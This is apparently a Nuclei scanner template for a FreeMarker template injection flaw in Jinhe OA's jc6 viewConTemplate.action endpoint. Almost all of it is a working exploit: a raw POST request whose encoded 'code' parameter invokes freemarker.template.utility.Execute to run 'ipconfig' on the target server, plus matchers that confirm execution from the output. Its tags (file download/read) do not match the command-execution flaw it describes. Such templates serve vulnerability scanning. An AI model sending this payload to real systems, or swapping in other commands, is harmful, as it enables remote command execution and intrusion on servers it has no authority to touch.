id: jinheOA-jc6-viewConTemplate-action-cmd

info:
  name: 金和OA_jc6_viewConTemplate.action存在FreeMarker模板注入漏洞
  author: cnaq
  severity: high
  description: 金和OA_jc6_viewConTemplate.action存在FreeMarker模板注入漏洞
  reference:
    - https://github.com/wy876/POC/blob/main/%E9%87%91%E5%92%8COA_jc6_viewConTemplate.action%E5%AD%98%E5%9C%A8FreeMarker%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
  tags: jinheOA,download,file,read

requests:
  - raw:
      - |
        POST /jc6/platform/portalwb/portalwb-con-template!viewConTemplate.action HTTP/1.1
        Host: {{Hostname}}
        Accept-Encoding: gzip
        Content-Type: application/x-www-form-urlencoded
        
        moduId=1&code=%253Cclob%253E%2524%257B%2522freemarker.template.utility.Execute%2522%253Fnew%28%29%28%2522ipconfig%2522%29%257D%253C%252Fclob%253E&uuid=1


    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - '200'
      - type: regex
        part: body
        regex:
          - '[^0-9]((127\.0\.0\.1)|(10\.\d{1,3}\.\d{1,3}\.\d{1,3})|(172\.((1[6-9])|(2\d)|(3[01]))\.\d{1,3}\.\d{1,3})|(192\.168\.\d{1,3}\.\d{1,3}))'